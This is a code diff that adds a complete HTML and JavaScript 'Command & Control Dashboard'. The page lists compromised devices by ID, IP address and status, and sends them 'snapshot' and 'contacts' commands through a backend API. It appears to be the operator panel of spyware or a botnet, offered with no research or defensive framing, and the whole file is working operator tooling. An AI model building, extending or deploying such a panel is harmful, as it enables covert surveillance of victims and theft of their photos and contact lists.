@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>C2 Control Panel</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; }
+        .container { max-width: 1200px; margin: auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        h1 { text-align: center; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
+        th { background-color: #333; color: white; }
+        .status-online { color: green; font-weight: bold; }
+        .status-offline { color: red; font-weight: bold; }
+        .action-btn { padding: 5px 10px; margin-right: 5px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 3px; }
+        .action-btn:hover { background-color: #0056b3; }
+        #loading { text-align: center; padding: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Command & Control Dashboard</h1>
+        <div id="loading">Loading devices...</div>
+        <table id="devices-table" style="display: none;">
+            <thead>
+                <tr>
+                    <th>Device ID</th>
+                    <th>Status</th>
+                    <th>IP Address</th>
+                    <th>Last Seen</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody id="device-list">
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+        async function fetchDevices() {
+            try {
+                const response = await fetch('/api/v1/devices', {
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
+                });
+                if (!response.ok) throw new Error('Network response was not ok');
+                const devices = await response.json();
+                const tbody = document.getElementById('device-list');
+                tbody.innerHTML = '';
+                devices.forEach(device => {
+                    const row = document.createElement('tr');
+                    const statusClass = device.status === 'online' ? 'status-online' : 'status-offline';
+                    row.innerHTML = `
+                        <td>${device.device_id}</td>
+                        <td class="${statusClass}">${device.status}</td>
+                        <td>${device.ip || 'N/A'}</td>
+                        <td>${device.last_seen || 'N/A'}</td>
+                        <td>
+                            <button class="action-btn" onclick="sendCommand('${device.device_id}', 'snapshot')">Snapshot</button>
+                            <button class="action-btn" onclick="sendCommand('${device.device_id}', 'contacts')">Contacts</button>
+                        </td>
+                    `;
+                    tbody.appendChild(row);
+                });
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('devices-table').style.display = 'table';
+            } catch (error) {
+                document.getElementById('loading').innerHTML = 'Error loading devices.';
+                console.error('Fetch error:', error);
+            }
+        }
+
+        async function sendCommand(deviceId, command) {
+            try {
+                const response = await fetch('/api/v1/command', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ device_id: deviceId, command: command })
+                });
+                if (response.ok) {
+                    alert(`Command ${command} sent to ${deviceId}`);
+                } else {
+                    alert('Failed to send command');
+                }
+            } catch (error) {
+                alert('Error: ' + error.message);
+            }
+        }
+
+        window.onload = fetchDevices;
+    </script>
+</body>
+</html>
